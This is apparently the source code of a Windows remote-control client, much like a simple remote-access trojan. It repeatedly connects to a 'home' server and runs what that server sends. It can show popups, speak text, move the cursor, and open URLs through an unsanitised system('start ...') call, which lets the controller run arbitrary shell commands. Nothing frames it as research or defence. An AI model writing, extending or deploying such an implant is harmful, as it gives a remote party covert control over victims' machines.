#include "ip.h"
#include "../../packet.h"
#include <iostream>
#include <asio.hpp>
#include <string>
#include <thread>
#include <map>
#include <windows.h>
#include <sapi.h>

using asio::ip::tcp;


void show_popup(const char* message) {
    MessageBoxA(NULL, message, "Popup", MB_OK | MB_ICONINFORMATION);
}
class Packet_Manager {
    private:
    public:
        static int packetid;
        static std::map<int, Packet_Manager*> Every_Package;
        Packet_Manager() {
            Every_Package[packetid++] = this;
        }
        virtual void receive(const Packet& packet) {//std::cout << "This packet cannot receive\n";
        }
        virtual void send(tcp::socket &socket, Packet packet) {//std::cout << "This packet cannot send\n";
        }
};
int Packet_Manager::packetid = 0;
std::map<int, Packet_Manager*> Packet_Manager::Every_Package;
class Get_data : public Packet_Manager {
    void send(tcp::socket &socket, Packet packet) override {
        std::thread([&socket, packet]() {
            if (packet.id == packet_id::GET_DATA) {
                Packet alive_packet{};
                alive_packet.id = packet_id::GET_DATA;
                alive_packet.number = 1;
                asio::write(socket, asio::buffer(&alive_packet, sizeof(alive_packet)));
            }
        }).detach();                       
    }
};
class Popup : public Packet_Manager {
    void receive(const Packet& packet) override {
        show_popup(packet.str);
    }
};
class Open_link : public Packet_Manager {
    void receive(const Packet &packet) override {
        std::string url = std::string(packet.str);
        std::string command = "start " + url;
        system(command.c_str());
    }
};
class tts : public Packet_Manager {
    void receive(const Packet &packet) override {
        ISpVoice* pVoice = nullptr;
         if (FAILED(::CoInitialize(NULL))) {
             std::cerr << "Failed to initialize COM\n";
             return;
         }

         HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
         if (SUCCEEDED(hr)) {
             wchar_t wmsg[256];
             MultiByteToWideChar(CP_UTF8, 0, packet.str, -1, wmsg, 256);
             pVoice->Speak(wmsg, 0, NULL);
             pVoice->Release();
         } else {
             std::cerr << "Failed to create SAPI voice\n";
         }

         ::CoUninitialize();                     
    }       
};
class curser_pos : public Packet_Manager {
    void receive(const Packet &packet) override {
        SetCursorPos(packet.x,packet.y);
    }
};

int main() {
    Get_data get_data_handle;
    Popup pop_up_handle;
    Open_link open_link_handle;
    tts tts_handle;
    curser_pos curser_pos_handle;

    while(true) {
        std::cout << "trying to connect to home\n";
        try {
            asio::io_context io_context;

            tcp::resolver resolver(io_context);
            auto endpoints = resolver.resolve(ip, "1234");

            tcp::socket socket(io_context);
            asio::connect(socket, endpoints);
            std::cout << "connect to home yayayayayayayayyayay\n";

            while (true) {
                Packet packet;
                std::size_t len = asio::read(socket, asio::buffer(&packet, sizeof(Packet)));

                if (len == sizeof(Packet)) {
                    for(auto [id, handler] : Packet_Manager::Every_Package) {
                        if(packet.id == (packet_id)id) {
                            handler->receive(packet);
                            handler->send(socket, packet);
                        }
                    }
                } else {
                    std::cerr << "Error: Incomplete packet received." << std::endl;
                }

            }

        } catch (std::exception& e) {
            std::cout << "failed to connect to home \n";
            std::cerr << "Exception: " << e.what() << "\n";
        }
    }
    return 0;
}
